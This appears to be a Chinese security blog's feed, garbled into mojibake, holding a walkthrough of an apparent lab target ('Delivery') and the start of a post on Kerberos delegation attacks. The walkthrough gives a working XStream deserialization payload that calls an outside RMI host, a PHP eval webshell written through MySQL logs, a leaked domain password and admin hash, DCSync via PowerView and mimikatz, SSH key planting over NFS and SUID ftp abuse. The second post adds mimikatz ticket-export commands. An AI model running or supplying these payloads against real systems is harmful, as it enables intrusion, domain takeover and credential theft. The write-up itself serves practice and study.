    <content type="html"><![CDATA[<h1 id="Delivery"><a href="#Delivery" class="headerlink" title="Delivery"></a>Delivery</h1><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">39.99.229.95:21 open</span><br><span class="line">39.99.229.95:8080 open</span><br><span class="line">39.99.229.95:22 open</span><br><span class="line">39.99.229.95:80 open</span><br><span class="line">[*] alive ports len is: 4</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.99.229.95       code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] WebTitle http://39.99.229.95:8080  code:200 len:3655   title:å…¬å¸å‘è´§å•</span><br><span class="line">[+] ftp 39.99.229.95:21:anonymous</span><br><span class="line">   [-&gt;]1.txt</span><br><span class="line">   [-&gt;]pom.xml</span><br></pre></td></tr></table></figure><p>æœ‰ä¸ªftpï¼Œpom.xmlé‡Œé¢ç»™äº†ccã€streamï¼Œç„¶åçœ‹äº†çœ¼äº¤è¡¨çš„æ•°æ®åŒ…ï¼Œå­˜åœ¨Ndayï¼Œ<a href="https://github.com/vulhub/vulhub/blob/master/xstream/CVE-2021-29505/README.zh-cn.mdï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹ï¼Œå…¶ä»–çš„æŒ‰ç…§æ–‡æ¡£é‡Œé¢çš„å†™å°±è¡Œ">https://github.com/vulhub/vulhub/blob/master/xstream/CVE-2021-29505/README.zh-cn.mdï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹ï¼Œå…¶ä»–çš„æŒ‰ç…§æ–‡æ¡£é‡Œé¢çš„å†™å°±è¡Œ</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">POST /just_sumbit_it HTTP/1.1</span><br><span class="line">Host: 39.99.134.215:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 3115</span><br><span class="line"></span><br><span class="line">&lt;java.util.PriorityQueue serialization=<span class="string">&#x27;custom&#x27;</span>&gt;</span><br><span class="line">    &lt;unserializable-parents/&gt;</span><br><span class="line">    &lt;java.util.PriorityQueue&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">            &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">        &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;<span class="built_in">type</span>&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span><br><span class="line">                &lt;m__obj class=<span class="string">&#x27;string&#x27;</span>&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content&lt;/m__obj&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;<span class="built_in">type</span>&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class=<span class="string">&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27;</span> serialization=<span class="string">&#x27;custom&#x27;</span>&gt;</span><br><span class="line">                &lt;message class=<span class="string">&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;</span>&gt;</span><br><span class="line">                    &lt;parsedMessage&gt;<span class="literal">true</span>&lt;/parsedMessage&gt;</span><br><span class="line">                    &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;</span><br><span class="line">                    &lt;bodyParts/&gt;</span><br><span class="line">                    &lt;sm class=<span class="string">&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;</span>&gt;</span><br><span class="line">                        &lt;attachmentsInitialized&gt;<span class="literal">false</span>&lt;/attachmentsInitialized&gt;</span><br><span class="line">                        &lt;nullIter class=<span class="string">&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;</span>&gt;</span><br><span class="line">                            &lt;aliases class=<span class="string">&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;</span>&gt;</span><br><span class="line">                                &lt;candidates class=<span class="string">&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;</span>&gt;</span><br><span class="line">                                    &lt;names&gt;</span><br><span class="line">                                        &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                        &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                    &lt;/names&gt;</span><br><span class="line">                                    &lt;ctx&gt;</span><br><span class="line">                                        &lt;environment/&gt;</span><br><span class="line">                                        &lt;registry class=<span class="string">&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27;</span> serialization=<span class="string">&#x27;custom&#x27;</span>&gt;</span><br><span class="line">                                            &lt;java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                                &lt;string&gt;UnicastRef&lt;/string&gt;</span><br><span class="line">                                                &lt;string&gt;47.121.123.96&lt;/string&gt;</span><br><span class="line">                                                &lt;int&gt;1099&lt;/int&gt;</span><br><span class="line">                                                &lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                                                &lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                &lt;short&gt;0&lt;/short&gt;</span><br><span class="line">                                                &lt;boolean&gt;<span class="literal">false</span>&lt;/boolean&gt;</span><br><span class="line">                                            &lt;/java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                        &lt;/registry&gt;</span><br><span class="line">                                        &lt;host&gt;47.121.123.96&lt;/host&gt;</span><br><span class="line">                                        &lt;port&gt;1099&lt;/port&gt;</span><br><span class="line">                                    &lt;/ctx&gt;</span><br><span class="line">                                &lt;/candidates&gt;</span><br><span class="line">                            &lt;/aliases&gt;</span><br><span class="line">                        &lt;/nullIter&gt;</span><br><span class="line">                    &lt;/sm&gt;</span><br><span class="line">                &lt;/message&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>æ­å»ºä»£ç†ã€æ‰«æå†…ç½‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">172.22.13.6:88 open</span><br><span class="line">172.22.13.14:8080 open</span><br><span class="line">172.22.13.28:8000 open</span><br><span class="line">172.22.13.28:3306 open</span><br><span class="line">172.22.13.28:445 open</span><br><span class="line">172.22.13.6:445 open</span><br><span class="line">172.22.13.28:139 open</span><br><span class="line">172.22.13.6:139 open</span><br><span class="line">172.22.13.28:135 open</span><br><span class="line">172.22.13.6:135 open</span><br><span class="line">172.22.13.57:80 open</span><br><span class="line">172.22.13.28:80 open</span><br><span class="line">172.22.13.57:22 open</span><br><span class="line">172.22.13.14:22 open</span><br><span class="line">172.22.13.14:21 open</span><br><span class="line">172.22.13.14:80 open</span><br><span class="line">[*] alive ports len is: 16</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.13.28</span><br><span class="line">   [-&gt;]WIN-HAUWOLAO</span><br><span class="line">   [-&gt;]172.22.13.28</span><br><span class="line">[*] NetBios: 172.22.13.6     [+]DC XIAORANG\WIN-DC          </span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.13.6</span><br><span class="line">   [-&gt;]WIN-DC</span><br><span class="line">   [-&gt;]172.22.13.6</span><br><span class="line">[*] WebTitle: http://172.22.13.28       code:200 len:2525   title:æ¬¢è¿ç™»å½•OAåŠå…¬å¹³å°</span><br><span class="line">[*] WebTitle: http://172.22.13.57       code:200 len:4833   title:Welcome to CentOS</span><br><span class="line">[*] WebTitle: http://172.22.13.14       code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] NetBios: 172.22.13.28    WIN-HAUWOLAO.xiaorang.lab           Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] WebTitle: http://172.22.13.28:8000  code:200 len:170    title:Nothing Here.</span><br><span class="line">[+] ftp://172.22.13.14:21:anonymous </span><br><span class="line">   [-&gt;]1.txt</span><br><span class="line">   [-&gt;]pom.xml</span><br><span class="line">[*] WebTitle: http://172.22.13.14:8080  code:200 len:3655   title:å…¬å¸å‘è´§å•</span><br><span class="line">[+] mysql:172.22.13.28:3306:root 123456</span><br></pre></td></tr></table></figure><p>å­˜åœ¨ä¸€ä¸ªmysqlå¼±å£ä»¤ï¼Œå…ˆæ‰“äº†ï¼Œç›´æ¥ä¸€å¥—ä¸æ»‘å°è¿æ‹›å†™é©¬ï¼Œæœ‰secureé˜²æŠ¤åˆ©ç”¨æ—¥å¿—è®°å½•ä¿å­˜åé—¨ã€‚</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show <span class="keyword">variables</span> like <span class="comment">&quot;secure_file_priv&quot;</span>;</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢æ—¥å¿—ä¿å­˜çŠ¶æ€ï¼ˆonæ˜¯å¼€å¯ï¼Œoffæ˜¯å…³é—­ï¼‰å’Œæ—¥å¿—ä¿å­˜è·¯å¾„</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show <span class="keyword">variables</span> like <span class="comment">&#x27;%general%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ˜¯å¦å¼€å¯äº†secureä¿æŠ¤</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show <span class="keyword">variables</span> like <span class="comment">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹general_logçš„å€¼ï¼Œå¼€å¯æ—¥å¿—ä¿å­˜</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> global <span class="attribute">general_log</span>=<span class="string">&#x27;On&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹æ—¥å¿—ä¿å­˜è·¯å¾„(general_log_fileå€¼)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> global <span class="attribute">general_log_file</span>=<span class="string">&#x27;ç½‘ç«™ç»å¯¹è·¯å¾„/é©¬å­&#x27;</span>;</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢æ˜¯å¦æˆåŠŸæ›´æ”¹</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show <span class="keyword">variables</span> like <span class="comment">&#x27;%general%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¸‹é¢çš„sqlè¯­å¥ä¼šè¢«å†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶ä¸­</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">select &#x27;</span><span class="language-php"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">0</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27;;</span></span><br></pre></td></tr></table></figure><p>èšå‰‘è¿æ¥æ‹¿åˆ°flag</p><h2 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h2><p>åšä¸‹ä¿¡æ¯æ”¶é›†ï¼Œå¯ä»¥çœ‹åˆ°chengleiè¿™ä¸ªç”¨æˆ·æœ‰å†™å…¥æƒé™çš„å–”</p><p><img src="../ç¬”è®°å›¾/image-20240922185942436.png" alt="image-20240922185942436"></p><p>mimikatzæŠ“ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰å“ˆå¸Œï¼Œç¡®å®æ˜¯æœ‰çš„</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* Username : <span class="type">chenglei</span></span><br><span class="line">* Domain   : <span class="type">XIAORANG.LAB</span></span><br><span class="line">* Password : <span class="type">Xt61f3LBhg1</span></span><br></pre></td></tr></table></figure><p>rdpä¸Šå»å†™ä¸ªdcsyncï¼Œç„¶ådcsync</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Import</span>-<span class="keyword">Module</span> .\powerview.ps1</span><br><span class="line"></span><br><span class="line"><span class="keyword">Add</span>-DomainObjectAcl -TargetIdentity &#x27;DC=xiaorang,DC=lab&#x27; -PrincipalIdentity chenglei -Rights DCSync -<span class="keyword">Verbose</span></span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">500     Administrator   6341235defdaed66fb7b682665752c9a        512</span><br></pre></td></tr></table></figure><p>æ¨ªå‘åŸŸæ§æ‹¿åˆ°flag</p><h2 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h2><p>å…ˆå®‰è£…ä¸€ä¸‹nfsæœåŠ¡</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">apt</span>-<span class="meta">get</span> install nfs-<span class="meta">common</span> -y</span><br></pre></td></tr></table></figure><p>æŒ‚åœ¨ä¸€ä¸‹nfs</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /</span><br><span class="line">mkdir Chu0</span><br><span class="line">mount -t nfs <span class="number">172.22</span><span class="number">.13</span><span class="number">.57</span>:<span class="regexp">/ ./</span>Chu0 -o nolock</span><br></pre></td></tr></table></figure><p>å†™å…¬é’¥sshè¿ä¸Šå»</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096</span><br><span class="line"><span class="keyword">cd</span> <span class="string">/temp/home/joyce/</span></span><br><span class="line">mkdir <span class="string">.ssh</span></span><br><span class="line"><span class="keyword">cd</span> <span class="string">.ssh</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;sshç§é’¥&quot;</span> &gt;  authorized_keys</span><br><span class="line">proxychains4 ssh  -i <span class="string">/root/.ssh/id_rsa</span> joyce@172.22.13.57</span><br></pre></td></tr></table></figure><p>å‘ç°æ²¡æœ‰æƒé™è¯»å–</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>bin/chsh</span><br><span class="line"><span class="regexp">/usr/</span>bin/pkexec</span><br><span class="line"><span class="regexp">/usr/</span>bin/newgrp</span><br><span class="line"><span class="regexp">/usr/</span>bin/su</span><br><span class="line"><span class="regexp">/usr/</span>bin/chfn</span><br><span class="line"><span class="regexp">/usr/</span>bin/gpasswd</span><br><span class="line"><span class="regexp">/usr/</span>bin/ftp</span><br></pre></td></tr></table></figure><p>æœ‰ftpå¯ä»¥åˆ©ç”¨ï¼Œæˆ‘ä»¬åœ¨å…¥å£æœºå™¨å¼€ä¸€ä¸ªftpæœåŠ¡ï¼Œç„¶åæŠŠflagä¼ ä¸Šå»å°±å¥½äº†</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pyftpdlib -<span class="selector-tag">p</span> <span class="number">250</span> -u admin -<span class="selector-tag">P</span> admin -w &amp;</span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ftp</span> <span class="number">172.22.13.14</span> <span class="number">250</span></span><br><span class="line"><span class="attribute">put</span> flag02.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>åŸŸæ¸—é€ä¹‹å§”æ´¾æ”»å‡»</title>
    <link href="https://bowuchuling.github.io/posts/yushentouweipai.html"/>
    <id>https://bowuchuling.github.io/posts/yushentouweipai.html</id>
    <published>2024-09-07T10:10:30.199Z</published>
    <updated>2024-09-07T14:39:18.104Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åŸŸæ¸—é€ä¹‹å§”æ´¾æ”»å‡»"><a href="#åŸŸæ¸—é€ä¹‹å§”æ´¾æ”»å‡»" class="headerlink" title="åŸŸæ¸—é€ä¹‹å§”æ´¾æ”»å‡»"></a>åŸŸæ¸—é€ä¹‹å§”æ´¾æ”»å‡»</h1><h2 id="å‰æƒ…æè¦ä¹‹Kerberosèº«ä»½éªŒè¯"><a href="#å‰æƒ…æè¦ä¹‹Kerberosèº«ä»½éªŒè¯" class="headerlink" title="å‰æƒ…æè¦ä¹‹Kerberosèº«ä»½éªŒè¯"></a>å‰æƒ…æè¦ä¹‹Kerberosèº«ä»½éªŒè¯</h2><p><strong>Kerberosåè®®åœ¨èº«ä»½éªŒè¯è¿‡ç¨‹ä¸­ä¸»è¦æ¶‰åŠä»¥ä¸‹å‡ ä¸ªå…³é”®æ­¥éª¤ï¼š</strong></p><ul><li><strong>ASï¼ˆAuthentication Serviceï¼‰è¯·æ±‚/å“åº”</strong>ï¼šç”¨æˆ·é¦–æ¬¡ç™»å½•æ—¶ï¼Œä¼šå‘Kerberosè®¤è¯æœåŠ¡å™¨ï¼ˆKDCï¼‰å‘é€ASè¯·æ±‚ï¼Œè·å–TGTï¼ˆTicket Granting Ticketï¼‰ã€‚</li><li><strong>TGSï¼ˆTicket Granting Serviceï¼‰è¯·æ±‚/å“åº”</strong>ï¼šç”¨æˆ·æŒæœ‰TGTå‘KDCçš„TGSæœåŠ¡è¯·æ±‚ç‰¹å®šæœåŠ¡çš„ç¥¨æ®ï¼ˆService Ticketï¼‰ï¼Œç”¨äºè®¿é—®ç›®æ ‡æœåŠ¡ã€‚</li><li><strong>æœåŠ¡è¯·æ±‚/å“åº”</strong>ï¼šç”¨æˆ·æŒæœ‰Service Ticketå‘ç›®æ ‡æœåŠ¡è¯·æ±‚è®¿é—®ï¼Œè¯¥æœåŠ¡éªŒè¯ç¥¨æ®å¹¶å…è®¸è®¿é—®ã€‚</li></ul><h2 id="ä¸€ã€éçº¦æŸæ€§å§”æ´¾"><a href="#ä¸€ã€éçº¦æŸæ€§å§”æ´¾" class="headerlink" title="ä¸€ã€éçº¦æŸæ€§å§”æ´¾"></a>ä¸€ã€éçº¦æŸæ€§å§”æ´¾</h2><p><strong>éçº¦æŸæ€§å§”æ´¾</strong>å…è®¸æŸä¸ªæœåŠ¡å™¨æˆ–æœåŠ¡ä»£è¡¨ä»»ä½•ç”¨æˆ·è®¿é—®å…¶ä»–æœåŠ¡ã€‚è¿™æ„å‘³ç€å½“æŸç”¨æˆ·è®¿é—®ä¸€ä¸ªé…ç½®äº†éçº¦æŸæ€§å§”æ´¾çš„æœåŠ¡å™¨æ—¶ï¼ŒæœåŠ¡å™¨å¯ä»¥è·å–å¹¶<strong>ç¼“å­˜ç”¨æˆ·çš„TGT</strong>ï¼Œå¹¶ä½¿ç”¨å®ƒæ¥è¯·æ±‚å…¶ä»–æœåŠ¡çš„ç¥¨æ®ã€‚è¿™ä¸ªTGTæ˜¯ç”¨æˆ·çš„æ ¸å¿ƒèº«ä»½éªŒè¯å‡­è¯ï¼Œä¸€æ—¦è·å–ï¼Œå‡ ä¹å¯ä»¥<strong>ä»£è¡¨è¯¥ç”¨æˆ·åœ¨KerberosåŸŸå†…æ‰§è¡Œä»»ä½•æ“ä½œ</strong>ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘å°†æ¼”ç¤ºåˆ©ç”¨éçº¦æŸæ€§å§”æ´¾è·å–åŸŸç®¡TGTå¹¶åˆ©ç”¨å…¶ç”³è¯·STè¿›è¡Œæ§åˆ¶åŸŸæ§ã€‚</p><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>å°†WEB2016æœºå™¨çš„å§”æ´¾å±æ€§è®¾ç½®ä¸º<strong>â€œä¿¡ä»»æ­¤è®¡ç®—æœºæ¥å§”æ´¾ä»»ä½•æœåŠ¡â€</strong></p><p><img src="../ç¬”è®°å›¾/image-20240906215008866.png" alt="image-20240906215008866"></p><h3 id="æ¼æ´å‘ç°"><a href="#æ¼æ´å‘ç°" class="headerlink" title="æ¼æ´å‘ç°"></a>æ¼æ´å‘ç°</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥è¯¢åŸŸå†…è®¾ç½®äº†éçº¦æŸå§”æ´¾çš„æœåŠ¡è´¦æˆ·ï¼š</span><br><span class="line">AdFind -b <span class="string">&quot;DC=chu0,DC=time&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> dn</span><br><span class="line"></span><br><span class="line">æŸ¥è¯¢åŸŸå†…è®¾ç½®äº†éçº¦æŸå§”æ´¾çš„æœºå™¨è´¦æˆ·:</span><br><span class="line">AdFind.exe -b <span class="string">&quot;DC=chu0,DC=time&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> dn</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240906215929576.png" alt="image-20240906215929576"></p><p>å¯ä»¥å‘ç°WEB2016æœºå™¨é…ç½®äº†éçº¦æŸæ€§å§”æ´¾ï¼Œå¹¶ä¸”web2016å¯æ§ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•åˆ©ç”¨éçº¦æŸæ€§å§”æ´¾è·å–æœºå™¨æƒé™</p><h3 id="é’“é±¼åˆ©ç”¨"><a href="#é’“é±¼åˆ©ç”¨" class="headerlink" title="é’“é±¼åˆ©ç”¨"></a>é’“é±¼åˆ©ç”¨</h3><p><strong>åˆ©ç”¨æ¡ä»¶</strong></p><ul><li>æœ‰ç®¡ç†å‘˜æƒé™</li><li>è¢«æ§æœºå™¨è´¦æˆ·å¼€å¯éçº¦æŸæ€§å§”æ´¾</li><li>åŸŸæ§ç®¡ç†å‘˜è¿œç¨‹è®¿é—®</li></ul><p>åœ¨éçº¦æŸæ€§è®¿é—®ä¸­æœ€é‡è¦çš„æ­¥éª¤å°±æ˜¯è·å–åŸŸç®¡çš„TGTï¼Œè€Œè·å–åŸŸç®¡çš„TGTéœ€è¦è®©åŸŸç®¡è®¿é—®é…ç½®äº†éçº¦æŸæ€§å§”æ´¾çš„æœºå™¨ï¼ˆWEB2016ï¼‰ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨é’“é±¼ç­‰æ–¹å¼è¯±å¯¼åŸŸç®¡è®¿é—®WEB2016ï¼Œè¿›è€Œè·å–åŸŸç®¡TGTï¼Œè¿™é‡Œä½¿ç”¨netå‘½ä»¤æ¨¡æ‹ŸåŸŸç®¡è¢«é’“é±¼çš„æƒ…å†µ</p><p>ä½¿ç”¨åŸŸç®¡è®¿é—®web2016æœåŠ¡å™¨ï¼Œè®©å…¶TGTç¼“å­˜åœ¨web2016æœºå™¨ä¸­</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\WEB2016.chu0.<span class="built_in">time</span></span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240906220332552.png" alt="image-20240906220332552"></p><p>è¿™é‡Œæ¨¡æ‹Ÿçš„æ˜¯é’“é±¼æˆåŠŸè®¿é—®ï¼Œå›åˆ°web2016å¯¼å‡ºç¥¨æ®ï¼ˆéœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::tickets /export&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20240906220903971.png" alt="image-20240906220903971"></p><p>å¯¼å‡ºäº†ä¸€å 